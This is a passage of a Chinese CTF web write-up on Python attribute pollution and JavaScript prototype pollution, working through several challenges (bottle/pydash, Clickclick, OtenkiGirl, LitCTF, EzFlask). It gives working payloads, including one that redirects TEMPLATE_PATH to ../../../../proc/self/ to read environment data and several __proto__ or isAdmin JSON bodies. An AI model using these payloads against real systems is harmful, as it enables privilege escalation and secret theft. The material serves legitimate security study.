class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;render&quot;</span></span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先看到这个set，来看看是如何工作的</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w16.png"></p>
<p>可以发现set按顺序赋值，然后你传入一个对象、属性名、值就可以更改掉其属性的值</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w17.png"></p>
<p>E.g</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">miHoYo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;Honkai&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.game = <span class="string">&quot;3rd&quot;</span></span><br><span class="line"></span><br><span class="line">m = miHoYo()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;before changing : <span class="subst">&#123;m.game&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pydash.set_(m,<span class="string">&quot;game&quot;</span>,<span class="string">&quot;StarRailway&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;after changing : <span class="subst">&#123;m.game&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到结果：</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w18.png"></p>
<p>源码前面给了hint，所以下一步我们应该污染参数而读取environ</p>
<p>而源码中没有什么可以读取environ的途径，然后看到下面的<code>bottle.template(path)</code>返回了一个值，跟进看看</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w19.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br></pre></td></tr></table></figure>

<p>lookup的搜索路径是<code>TEMPLATE_PATH</code>这个对象，然后看看<code>TEMPLATE_PATH</code></p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w20.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATE_PATH = [<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;./views/&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>默认的<code>TEMPLATE_PATH</code>是<code>[&#39;./&#39;, &#39;./views/&#39;]</code></p>
<p>其实到这里不继续深入的话就已经猜到可能是更改<code>TEMPLATE_PATH</code>默认的这个路径，让lookup去查找然后再由bottle.template渲染即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../proc/self/</span><br></pre></td></tr></table></figure>

<p>返回源码看<code>set_value()</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>payload应该是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setval.__globals__.bottle.TEMPLATE_PATH=[&#x27;../../../../proc/self/&#x27;]</span><br></pre></td></tr></table></figure>

<p>但是pydash是不允许修改<code>globals</code>属性的，但是在helpers.py中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESTRICTED_KEYS = (<span class="string">&quot;__globals__&quot;</span>,<span class="string">&quot;__builtins__&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>所以我们先污染这个值之后再污染path即可</p>
<p>payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setValue?name=pydash</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;[]&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">setValue?name=setval</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;../../../../proc/self/&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="Mini-L-CTF-2025-西电-CTF-终端-Clickclick"><a href="#Mini-L-CTF-2025-西电-CTF-终端-Clickclick" class="headerlink" title="Mini L-CTF 2025 - 西电 CTF 终端 Clickclick"></a><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/18?challenge=822">Mini L-CTF 2025 - 西电 CTF 终端</a> Clickclick</h4><p>源码拉到最下面可以看到：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Qt</span>(o, <span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">w</span>(e) &gt;= <span class="number">1e3</span> &amp;&amp; <span class="title function_">i</span>(l)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"> h.<span class="property">textContent</span> = <span class="string">`</span></span><br><span class="line"><span class="string">      if ( req.body.point.amount == 0 || req.body.point.amount == null) &#123; delete req.body.point.amount &#125;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就能知道10000次以后会输出textContent的内容（实在不行也可以直接丢个AI的，试过是可以分析出来10000次后面输出这个的）</p>
<p>然后看到：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wn</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">    <span class="title function_">ce</span>(e, !<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">const</span> r = <span class="string">&quot;/update-amount&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="title class_">Wr</span>(e, <span class="string">&quot;count&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="title class_">Jr</span>();</span><br><span class="line">    <span class="keyword">var</span> s = <span class="title function_">mn</span>();</span><br><span class="line">    s.<span class="property">__click</span> = [yn, n, r];</span><br><span class="line">    <span class="keyword">var</span> o = <span class="title class_">Pt</span>(s);</span><br><span class="line">    <span class="title class_">Tr</span>( <span class="function">() =&gt;</span> $r(o, <span class="string">`count is <span class="subst">$&#123;n() ?? <span class="string">&quot;&quot;</span>&#125;</span>`</span>)),</span><br><span class="line">    <span class="title function_">ct</span>(t, s),</span><br><span class="line">    <span class="title function_">he</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里每点击50次会向&#x2F;update-amount发一次包，更新后端数据，而且这里更新不是add而是set，又结合 if ( req.body.point.amount &#x3D;&#x3D; 0 || req.body.point.amount &#x3D;&#x3D; null) { delete req.body.point.amount }，可以看到amount一开始就是0或者是已经被删除了，而且这个路径看起来很像原型链污染，那么想要改变他的值可以尝试污染amount的值，让他变成10000</p>
<p>那么怎么知道原链呢，看看事件监听器那边的click</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>:<span class="string">&quot;set&quot;</span>,</span><br><span class="line">  <span class="string">&quot;point&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;10000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-OtenkiGirl-OtenkiGirl"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-OtenkiGirl-OtenkiGirl" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]OtenkiGirl) OtenkiGirl"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]OtenkiGirl) OtenkiGirl</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/17767089.html">NewStar2023 web-week3-wp - Eddie_Murphy - 博客园</a></p>
<p>这里有一个值得注意的点：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line"><span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br></pre></td></tr></table></figure>

<p>这是什么意思呢，结合注释能看出来，</p>
<p>首先声明了一个变量<code>minTimestamp</code>，将其初始化为<code>CONFIG.min_public_time</code>或<code>DEFAULT_CONFIG.min_public_time</code>的日期对象的时间戳。这里的<code>CONFIG.min_public_time</code>和<code>DEFAULT_CONFIG.min_public_time</code>表示了movie的最小公开时间。</p>
<p>接下来，代码使用<code>Math.max</code>函数将<code>timestamp</code>与<code>minTimestamp</code>比较，并返回较大的值。<code>timestamp</code>是另一个变量，表示某个数据的时间戳。通过执行这个比较操作，可以确保<code>timestamp</code>的值不早于<code>minTimestamp</code>，也就是不早于movie的最小公开时间</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">	<span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">	<span class="attr">&quot;reason&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">	<span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>    </span><br><span class="line">		<span class="attr">&quot;min_public_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1001-01-01&quot;</span>  </span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>





<h4 id="LitCTF-2025-多重宇宙日记-NSSCTF"><a href="#LitCTF-2025-多重宇宙日记-NSSCTF" class="headerlink" title="[LitCTF 2025]多重宇宙日记 | NSSCTF"></a>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6801">LitCTF 2025]多重宇宙日记 | NSSCTF</a></h4><p>源码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// 更新表单的JS提交</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;profileUpdateForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;updateStatus&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">        statusEl.<span class="property">textContent</span> = <span class="string">&#x27;正在更新...&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(event.<span class="property">target</span>);</span><br><span class="line">        <span class="keyword">const</span> settingsPayload = &#123;&#125;;</span><br><span class="line">        <span class="comment">// 构建 settings 对象，只包含有值的字段</span></span><br><span class="line">        <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>)) settingsPayload.<span class="property">theme</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;theme&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>)) settingsPayload.<span class="property">language</span> = formData.<span class="title function_">get</span>(<span class="string">&#x27;language&#x27;</span>);</span><br><span class="line">        <span class="comment">// ...可以添加其他字段</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">settings</span>: settingsPayload &#125;) <span class="comment">// 包装在 &quot;settings&quot;键下</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;成功: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                <span class="comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span></span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;错误: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            statusEl.<span class="property">textContent</span> = <span class="string">&#x27;请求失败: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送原始JSON的函数</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendRawJson</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> rawJson = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonSettings&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">const</span> statusEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rawJsonStatus&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> currentSettingsEl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">        statusEl.<span class="property">textContent</span> = <span class="string">&#x27;正在发送...&#x27;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> parsedJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawJson); <span class="comment">// 确保是合法的JSON</span></span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(parsedJson) <span class="comment">// 直接发送用户输入的JSON</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">const</span> result = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;成功: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">                currentSettingsEl.<span class="property">textContent</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(result.<span class="property">settings</span>, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">                 <span class="comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span></span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                statusEl.<span class="property">textContent</span> = <span class="string">&#x27;错误: &#x27;</span> + result.<span class="property">message</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">             statusEl.<span class="property">textContent</span> = <span class="string">&#x27;请求失败或JSON无效: &#x27;</span> + error.<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提示键值在setting下，又需要管理员权限，所以payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;settings&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;</span><br></pre></td></tr></table></figure>





<h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-DASCTF-2023-0X401七月暑期挑战赛-EzFlask-EzFlask"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-DASCTF-2023-0X401七月暑期挑战赛-EzFlask-EzFlask" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask) EzFlask"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[DASCTF">https://buuoj.cn/challenges#[DASCTF</a> 2023 &amp; 0X401七月暑期挑战赛]EzFlask) EzFlask</h4><p>开头直接给源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 